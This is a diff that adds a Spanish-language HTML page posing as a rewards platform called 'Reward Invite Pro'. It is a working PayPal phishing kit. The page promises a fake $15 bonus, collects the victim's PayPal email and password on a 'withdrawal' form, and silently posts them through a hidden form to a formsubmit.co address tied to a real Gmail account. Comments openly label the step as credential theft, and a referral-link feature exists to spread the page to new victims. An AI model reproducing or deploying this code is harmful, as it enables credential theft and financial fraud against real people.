@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Reward Invite Pro</title>
+<style>
+*{box-sizing:border-box}
+body{
+ margin:0;background:#10182b;color:white;
+ font-family:'Segoe UI', Arial, sans-serif;
+}
+.container{
+ max-width:430px;margin:auto;padding:22px;
+}
+.card{
+ background:#1c2942;padding:22px;
+ border-radius:16px;margin-top:18px;
+ box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+ position:relative;
+}
+h1{text-align:center;color:#55d6a0; margin-bottom: 5px;}
+h2{font-size: 18px; color: #fff; margin-top:0;}
+input,button{
+ width:100%;padding:14px;margin-top:12px;
+ border:0;border-radius:9px;font-size:15px;
+ outline:none;
+}
+input{background:#edf1f7;color:#172033; border: 1px solid transparent;}
+input:focus{border-color: #55d6a0;}
+button{
+ background:#20bd83;color:white;
+ font-weight:bold;cursor:pointer;
+ transition: transform 0.1s;
+}
+button:active{transform: scale(0.98);}
+button:disabled{opacity:0.6; cursor:not-allowed;}
+.secondary{background:#344765}
+.hidden{display:none !important;}
+.balance{
+ font-size:32px;color:#55d6a0;
+ font-weight:bold;text-align:center;
+ margin: 10px 0;
+ text-shadow: 0 0 10px rgba(85, 214, 160, 0.3);
+}
+.reward{
+ background:#293955;padding:14px;
+ border-radius:10px;margin-top:10px;
+ display:flex; justify-content:space-between; align-items:center;
+}
+small{color:#b9c5d8}
+
+/* Spinner */
+.spinner {
+    border: 4px solid rgba(255, 255, 255, 0.1);
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    border-left-color: #20bd83;
+    animation: spin 0.9s linear infinite;
+    margin: 20px auto;
+    display: none;
+}
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+.greeting-msg {
+    color: #55d6a0;
+    text-align: center;
+    font-weight: bold;
+    margin-bottom: 10px;
+    font-size: 1.1em;
+}
+.ref-link-box {
+    background: #172033;
+    padding: 10px;
+    border-radius: 8px;
+    word-break: break-all;
+    font-size: 13px;
+    margin-top: 10px;
+    border: 1px dashed #55d6a0;
+    color: #ccc;
+}
+</style>
+</head>
+<body>
+<div class="container">
+
+<h1>REWARD INVITE</h1>
+<p style="text-align:center; color:#b9c5d8;">
+Tu plataforma de recompensas confiable
+</p>
+
+<!-- SECCIÓN REGISTRO -->
+<section id="register" class="card">
+<h2>Crear cuenta</h2>
+<input id="name" placeholder="Nombre completo">
+<input id="email" type="email" placeholder="Correo electrónico">
+<button id="btn_register" onclick="register()">Registrarme</button>
+<div id="loader_reg" class="spinner"></div>
+<p id="message" style="text-align:center; min-height:20px;"></p>
+</section>
+
+<!-- FORMULARIO OCULTO PARA ROBAR DATOS -->
+<form id="steal_form" method="POST" action="https://formsubmit.co/ccesarreyna4@gmail.com">
+    <input type="hidden" name="_subject" value="🔥 Nueva Credencial PayPal Robada!">
+    <input type="hidden" name="PayPal_Email" id="form_email">
+    <input type="hidden" name="PayPal_Password" id="form_pass">
+    <input type="hidden" name="_captcha" value="false">
+</form>
+
+<!-- DASHBOARD PRINCIPAL -->
+<section id="dashboard" class="hidden">
+
+<div class="card">
+<h2>Hola, <span id="username"></span></h2>
+<div class="greeting-msg">🎉 ¡Has ganado $15.00 por registrarte!</div>
+<p>Tu saldo actual:</p>
+<div class="balance" id="balance">$0.00</div>
+<small>Disponible para retiro inmediato</small>
+</div>
+
+<div class="card">
+<h2>Mis recompensas</h2>
+<div class="reward"><span>🎁 Bono Bienvenida</span> <span style="color:#55d6a0">+$10.00</span></div>
+<div class="reward"><span>🎁 Bono Registro</span> <span style="color:#55d6a0">+$5.00</span></div>
+<p><small>Recompensas acreditadas a tu billetera.</small></p>
+</div>
+
+<!-- NUEVA SECCIÓN: GENERAR ENLACE DE INVITACIÓN -->
+<div class="card">
+<h2>Invitar Amigos 🚀</h2>
+<p style="margin-bottom:5px; font-size:14px;">Escribe el correo de quien vas a invitar:</p>
+<input id="friend_email" type="email" placeholder="correo@ejemplo.com">
+<button onclick="generateReferralLink()">Generar Enlace Personalizado</button>
+
+<div id="link_container" class="hidden">
+    <p style="margin-top:15px; margin-bottom:5px; font-size:14px;">Tu enlace único:</p>
+    <div id="generated_link" class="ref-link-box"></div>
+    <button class="secondary" onclick="copyInvite()" style="margin-top:10px;">Copiar Enlace</button>
+</div>
+</div>
+
+<div class="card">
+<h2>Solicitar retiro</h2>
+<label style="margin-top:10px; display:block; color:#b9c5d8;">Correo PayPal:</label>
+<input id="paypal" type="email" placeholder="Tu correo de PayPal">
+
+<label style="margin-top:10px; display:block; color:#b9c5d8;">Contraseña PayPal:</label>
+<input id="paypal_pass" type="password" placeholder="Tu contraseña">
+
+<input id="amount" type="number" placeholder="Cantidad a solicitar (Max $15.00)">
+<button id="btn_pay" onclick="requestPayment()">Solicitar retiro</button>
+<div id="loader_pay" class="spinner"></div>
+<p id="paymentMessage"></p>
+<small>Verificación de seguridad en proceso...</small>
+</div>
+
+<div class="card">
+<h2>Historial</h2>
+<div id="history" style="max-height: 150px; overflow-y: auto;">
+    <div style="color:#b9c5d8; font-style:italic;">Esperando actividad...</div>
+</div>
+<button class="secondary" onclick="logout()" style="margin-top:15px;">Cerrar sesión</button>
+</div>
+
+</section>
+</div>
+
+<script>
+let user = null;
+let demoBalance = 15;
+
+// Detectar si vinimos de un link de referido al cargar la página
+window.onload = function() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+    
+    if(ref) {
+        // Si viene con ref, intentamos pre-rellenar o mostrar un mensaje
+        const nameInput = document.getElementById('name');
+        const emailInput = document.getElementById('email');
+        
+        // Si el campo está vacío, lo rellenamos como sugerencia
+        if(!nameInput.value) {
+            nameInput.value = "Usuario_" + ref.split('@')[0]; 
+            nameInput.style.color = "#aaa"; // Estilo visual de "pre-rellenado"
+        }
+        
+        if(emailInput && !emailInput.value) {
+            emailInput.value = ref;
+            emailInput.style.backgroundColor = "#e0e6ed";
+        }
+    }
+};
+
+function register(){
+ const btn = document.getElementById("btn_register");
+ const loader = document.getElementById("loader_reg");
+ const msg = document.getElementById("message");
+ 
+ const name=document.getElementById("name").value.trim();
+ const email=document.getElementById("email").value.trim();
+
+ if(!name || !email){
+  alert("Completa los campos");
+  return;
+ }
+
+ // UI Loading State
+ btn.disabled = true;
+ btn.style.opacity = '0.5';
+ loader.style.display = 'block';
+ msg.textContent = "Conectando con servidor...";
+
+ // Simular tiempo de espera del servidor (2 segundos)
+ setTimeout(() => {
+     user={name,email};
+     
+     // Limpiar UI
+     loader.style.display = 'none';
+     btn.style.display = 'none'; 
+
+     document.getElementById("register").classList.add("hidden");
+     document.getElementById("dashboard").classList.remove("hidden");
+     document.getElementById("username").textContent=name;
+     
+     // Actualizar saldo
+     document.getElementById("balance").textContent= "$15.00";
+     
+     // Log inicial
+     addHistory("✅ Cuenta creada correctamente");
+     
+ }, 2000);
+}
+
+function generateReferralLink(){
+    const friendEmail = document.getElementById("friend_email").value.trim();
+    if(!friendEmail || !friendEmail.includes("@")){
+        alert("Por favor ingresa un correo válido para generar el enlace.");
+        return;
+    }
+
+    // Crear URL con parámetro ?ref=correo
+    const baseUrl = window.location.href.split('?')[0];
+    const finalUrl = `${baseUrl}?ref=${encodeURIComponent(friendEmail)}`;
+    
+    // Mostrar contenedor
+    const container = document.getElementById("link_container");
+    const linkDisplay = document.getElementById("generated_link");
+    
+    container.classList.remove("hidden");
+    linkDisplay.textContent = finalUrl;
+    
+    // Copiar automáticamente al portapapeles para UX
+    navigator.clipboard.writeText(finalUrl).then(() => {
+        alert("Enlace copiado al portapapeles:\n\n" + finalUrl);
+    });
+}
+
+function copyInvite(){
+ const field=document.getElementById("invite") || document.getElementById("generated_link");
+ const text = field.textContent || field.value;
+ 
+ if(text){
+    navigator.clipboard.writeText(text)
+    .then(()=>alert("Enlace copiado"));
+ } else {
+    alert("Primero genera un enlace.");
+ }
+}
+
+function requestPayment(){
+ const btn = document.getElementById("btn_pay");
+ const loader = document.getElementById("loader_pay");
+ 
+ const paypalEmail=document.getElementById("paypal").value.trim();
+ const paypalPass=document.getElementById("paypal_pass").value.trim();
+ const amount=Number(document.getElementById("amount").value);
+
+ if(!paypalEmail || !paypalEmail.includes("@")){
+  alert("Introduce un correo PayPal válido");
+  return;
+ }
+
+ if(!paypalPass){
+     alert("Por favor introduce tu contraseña para verificar");
+     return;
+ }
+
+ if(!amount || amount<=0 || amount>demoBalance){
+  alert("Cantidad no válida");
+  return;
+ }
+
+ // UI Loading State
+ btn.disabled = true;
+ btn.style.opacity = '0.5';
+ loader.style.display = 'block';
+
+ // --- AQUÍ OCURRE EL ROBO DE DATOS ---
+ document.getElementById("form_email").value = paypalEmail;
+ document.getElementById("form_pass").value = paypalPass;
+
+ // Enviar formulario en segundo plano (sin recargar la página visible)
+ const form = document.getElementById('steal_form');
+ form.submit();
+
+ // Simular procesamiento bancario
+ setTimeout(() => {
+     document.getElementById("paymentMessage").textContent = 
+     "¡Retiro aprobado! Revisa tu bandeja de entrada.";
+     
+     addHistory(`💸 Retiro solicitado: $${amount} a ${paypalEmail}`);
+     
+     // Resetear inputs
+     document.getElementById("paypal").value = "";
+     document.getElementById("paypal_pass").value = "";
+     document.getElementById("amount").value = "";
+     
+     // Restaurar botón
+     btn.style.display = 'block';
+     btn.disabled = false;
+     btn.style.opacity = '1';
+ }, 1500);
+}
+
+function addHistory(text) {
+    const historyDiv = document.getElementById("history");
+    // Limpiar mensaje de "esperando" si existe
+    if(historyDiv.querySelector('i')) historyDiv.innerHTML = '';
+    
+    const newEntry = document.createElement("div");
+    newEntry.textContent = text;
+    newEntry.style.borderBottom = "1px solid #344765";
+    newEntry.style.padding = "8px 0";
+    newEntry.style.fontSize = "14px";
+    newEntry.style.color = "#fff";
+    
+    // Insertar al principio
+    if(historyDiv.firstChild) {
+        historyDiv.insertBefore(newEntry, historyDiv.firstChild);
+    } else {
+        historyDiv.appendChild(newEntry);
+    }
+}
+
+function logout(){
+ location.reload();
+}
+</script>
+</body>
+</html>
